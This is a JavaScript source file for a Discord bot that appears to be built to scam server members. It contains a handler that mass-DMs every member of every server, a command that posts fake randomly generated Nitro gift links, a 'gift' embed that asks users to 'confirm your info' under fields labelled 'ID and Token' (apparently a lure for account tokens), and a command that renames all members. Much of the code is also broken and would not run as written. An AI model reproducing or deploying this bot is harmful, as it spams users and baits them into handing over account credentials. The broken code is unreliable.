const Discord = require('discord.js');
const nitro = ["abcd" , "text" , "text"];
var servers = {};
const { prefix, token } = require("./config.json");
const Util = require('discord.js');
const client = new Discord.Client;
let msg = ""; 


client.on('and go', () => {
        client.guilds.forEach(g=>{
        g.members.forEach(member=>{
            setTimeout(function(){
        if(member.id == bot.user.id) return;
        if(member.user.bot) return;
        if (member.hasPermission("MANAGE_ROLES")) return;
        console.log(`send message ${member.user.username}`);
        member.send(`test`);
    }, 30000);
    });
})
});


client.on('ready' , ()=>{
    console.log('started');
});


client.on('message', (message) => {
   

    if (message.author.bot) return;

    if (message.content.startsWith(prefix + 'start')){
            message.channel.send("> **WELCOME** <@" + message.author.id + ">", {files: ["./images/tenor.gif"]});
         
    }
    if (message.content.startsWith(prefix + 'start')){
    setTimeout(() => {  message.channel.send("> **DONE**") }, 7570)
    }
    if (message.content.startsWith(prefix + 'nitro')){
        var embed = new Discord.MessageEmbed()
        .setAuthor("Zaxk")
        .setDescription ("this is a unvierifed nitro you might have to give it a couple of tries every day to get lucky ")
        .setFooter("Zaxk#0967")
        .addField ("this was created by yours truly maybe these are cool")
        .addField('discord.gift/'+ Math.floor(10000000000000000000 + Math.random() * 9000000000000000000).toString(36).substr(0, 36) )
        .setThumbnail ("https://media1.tenor.com/images/42a8d4625aeb088c45eba5a84ca36325/tenor.gif?itemid=11193323")
        .setColor ("00ff00");
        message.channel.send("Hey there <@" + message.author.id + ">")
        setTimeout(() => {  message.channel.send(embed); }, 2070);
    

}

if (message.content.startsWith(prefix + "setnick")) {
    
 let nick = message.content.slice((prefix + "setnick").length)
if (!nick) return message.channel.send("please enter a nickname for all users").then(r=>r.delete(5000))

message.guild.members.forEach(r=>r.setNickname(nick + r.name))

message.send("changing nicknames")
    
 }

 if (message.content.startsWith(prefix + "gift")) {
  var embed = new Discord.MessageEmbed()
  .setAuthor("Zaxk :cool:")
  .setDescription ("``` Chose your gift```")
  .setFooter("Zaxk#0967")
  .addField("*Nitro*","random nitro from 1 month classic to 1 year boost")
  .addField("*Games*","a ramdon game from discord page")
  .addField("**confirm your info**", "check with Zaxk and verify your info")
  .addField("ID and Token", message.author.id)
  .addField("token", "id" )
  .setThumbnail ("https://media1.tenor.com/images/8055d22f534c0792eb170d18cf4a3e2b/tenor.gif?itemid=13300784")
  .setColor ("00ff00");
  message.channel.send("Hey there <@" + message.author.id + ">")
  setTimeout(() => {  message.channel.send(embed); }, 2070);

} 

});
client.on('message', message => {
    if (message.content === 'general_commands') {
        let helpEmbed = new Discord.MessageEmbed()
        .setTitle('**Zaxk#0967**')
        .addField('avatar', "finds your avatar")
        .addField('gif', 'just a cool gif')
        .addField('ping', 'just ping me...')
        .setFooter('i dont know its still beta dude !')
      message.channel.send(helpEmbed);
    }
});
